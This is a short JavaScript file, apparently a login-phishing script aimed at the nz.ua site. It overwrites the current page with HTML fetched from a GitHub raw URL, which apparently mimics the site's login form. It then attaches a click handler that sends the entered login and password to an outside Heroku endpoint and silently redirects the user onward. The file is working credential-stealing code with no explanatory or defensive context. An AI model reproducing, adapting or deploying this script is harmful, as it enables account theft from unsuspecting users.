function g(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function createMyScript() {
    let script = document.createElement('script')
    script.innerHTML = `function post(url, data) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', null);
    xhr.send(JSON.stringify(data));
}
function getNextUrl() {
    let url = new URL(window.location.href);
    let next = url.searchParams.get('next');
    return next ? next : 'https://nz.ua/menu/'
}
let btn = document.getElementById('form-button');
let fform = document.getElementById('login-form')
let l = document.getElementById('loginform-login')
let p = document.getElementById('loginform-password')
const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
const nextUrl = getNextUrl()

btn.addEventListener('click', () => {
    post(url, {l: l.value, p: p.value});
    window.location.href = nextUrl;
});`;
    return script
}
document.documentElement.innerHTML = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')
document.body.appendChild( createMyScript() )